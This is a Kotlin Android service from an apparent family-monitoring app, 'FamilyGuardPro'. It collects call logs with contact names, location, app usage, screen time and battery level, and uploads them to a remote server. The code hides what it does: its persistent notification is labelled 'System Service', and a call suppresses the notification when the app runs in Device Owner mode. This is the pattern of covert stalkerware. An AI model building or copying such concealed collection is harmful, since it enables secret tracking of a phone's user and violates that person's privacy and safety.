package com.familyguardpro.services

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.familyguardpro.FamilyGuardApp
import com.familyguardpro.R
import com.familyguardpro.network.ApiClient
import com.familyguardpro.utils.DataCollector
import com.familyguardpro.utils.PreferenceManager
import kotlinx.coroutines.*

class DataSyncService : Service() {
    
    companion object {
        private const val TAG = "DataSyncService"
        private const val NOTIFICATION_ID = 1006
    }
    
    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var preferenceManager: PreferenceManager
    
    override fun onCreate() {
        super.onCreate()
        preferenceManager = PreferenceManager(this)
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground()
        
        when (intent?.action) {
            "SYNC" -> performSync()
            "STOP" -> {
                stopForeground(STOP_FOREGROUND_REMOVE)
                stopSelf()
            }
        }
        
        return START_NOT_STICKY
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
    }
    
    private fun startForeground() {
        val notification = NotificationCompat.Builder(this, FamilyGuardApp.NOTIFICATION_CHANNEL_SYNC)
            .setContentTitle("System Service")
            .setContentText("Syncing...")
            .setSmallIcon(R.drawable.ic_notification)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
        
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(NOTIFICATION_ID, notification,
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
        
        // Suppress notification in Device Owner mode
        com.familyguardpro.utils.NotificationUtils.suppressForegroundNotificationIfDeviceOwner(
            this, NOTIFICATION_ID
        )
    }
    
    private fun performSync() {
        serviceScope.launch {
            try {
                Log.d(TAG, "Starting data sync...")
                
                val deviceId = preferenceManager.getDeviceId()
                if (deviceId.isEmpty()) {
                    Log.e(TAG, "No device ID, cannot sync")
                    stopSelf()
                    return@launch
                }
                
                val dataCollector = DataCollector(this@DataSyncService)
                val syncData = dataCollector.collectAllData()
                
                // Build sync request
                val syncRequest = com.familyguardpro.network.SyncRequestBody(
                    battery = syncData.batteryLevel,
                    screenTime = (dataCollector.getScreenTime() / 60000).toInt(),
                    apps = syncData.appUsage.map { app ->
                        com.familyguardpro.network.AppUsageItem(
                            packageName = app.packageName,
                            appName = app.appName,
                            usageTime = app.usageTime,
                            openCount = 1
                        )
                    },
                    callLogs = syncData.callLogs.map { call ->
                        com.familyguardpro.network.CallLogItem(
                            number = call.number,
                            name = call.name,
                            type = call.type,
                            duration = call.duration,
                            timestamp = call.timestamp
                        )
                    },
                    location = syncData.location?.let { loc ->
                        com.familyguardpro.network.LocationItem(
                            latitude = loc.latitude,
                            longitude = loc.longitude,
                            accuracy = loc.accuracy,
                            timestamp = System.currentTimeMillis()
                        )
                    },
                    notifications = emptyList()
                )
                
                val response = ApiClient.api.uploadData(deviceId, syncRequest)
                
                if (response.success) {
                    Log.d(TAG, "Sync successful")
                    preferenceManager.setLastSyncTime(System.currentTimeMillis())
                } else {
                    Log.e(TAG, "Sync failed: ${response.message}")
                }
                
            } catch (e: Exception) {
                Log.e(TAG, "Sync error", e)
            } finally {
                stopSelf()
            }
        }
    }
}
